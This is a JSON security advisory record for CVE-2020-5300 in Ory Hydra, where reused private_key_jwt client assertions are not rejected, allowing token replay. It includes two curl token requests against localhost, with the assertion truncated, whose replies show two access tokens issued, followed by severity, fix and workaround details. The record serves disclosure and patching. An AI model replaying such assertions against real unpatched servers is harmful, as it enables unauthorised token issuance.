{
  "id": "GHSA-3p3g-vpw6-4w66",
  "summary": "Authentication Bypass in hydra",
  "details": "### Impact\n\n\"When using client authentication method \"private_key_jwt\" [1], OpenId specification says the following about assertion `jti`:\"\n\n> A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties\n\n\"Hydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:\"\n\n  ```\n$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\u23ce            ~$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \\\n   --header 'Content-Type: application/x-www-form-urlencoded' \\\n   --data-urlencode 'grant_type=client_credentials' \\\n   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \\\n   --data-urlencode 'scope=application openid' \\\n   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \\\n   --data-urlencode 'client_assertion=eyJhb [...] jTw'\n{\"access_token\":\"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4\",\"expires_in\":3599,\"scope\":\"application openid\",\"token_type\":\"bearer\"}\n```\n\n\n### Severity\n\n\"We rate the severity as medium because the following reasons make it hard to replay tokens without the patch:\"\n\n- TLS protects against MITM which makes it difficult to intercept valid tokens for replay attacks\n- The expiry time of the JWT gives only a short window of opportunity where it could be replayed\n\n### Patches\n\nThis will be patched with v1.4.0+oryOS.17\n\n### Workarounds\n\nTwo workarounds have been identified:\n\n- Do not allow clients to use `private_key_jwt`\n- Use short expiry times for the JWTs\n\n### Upstream\n\nThis issue will be resolved in the upstream repository https://github.com/ory/fosite",
  "aliases": [
    "CVE-2020-5300"
  ],
  "modified": "2021-05-24T21:19:26Z",
  "published": "2021-05-27T18:43:22Z",
  "database_specific": {
    "cwe_ids": [
      "CWE-294"
    ],
    "github_reviewed": true,
    "severity": "MODERATE"
  },
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/ory/hydra/security/advisories/GHSA-3p3g-vpw6-4w66"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5300"
    },
    {
      "type": "WEB",
      "url": "https://github.com/ory/hydra/commit/700d17d3b7d507de1b1d459a7261d6fb2571ebe3"
    },
    {
      "type": "WEB",
      "url": "https://github.com/ory/hydra/releases/tag/v1.4.0"
    },
    {
      "type": "WEB",
      "url": "https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "github.com/ory/hydra",
        "ecosystem": "Go",
        "purl": "pkg:golang/github.com/ory/hydra"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.4.0"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/05/GHSA-3p3g-vpw6-4w66/GHSA-3p3g-vpw6-4w66.json"
      }
    },
    {
      "package": {
        "name": "github.com/ory/hydra/oauth2",
        "ecosystem": "Go",
        "purl": "pkg:golang/github.com/ory/hydra/oauth2"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.4.0"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/05/GHSA-3p3g-vpw6-4w66/GHSA-3p3g-vpw6-4w66.json"
      }
    }
  ],
  "schema_version": "1.2.0",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:N/A:N"
    }
  ]
}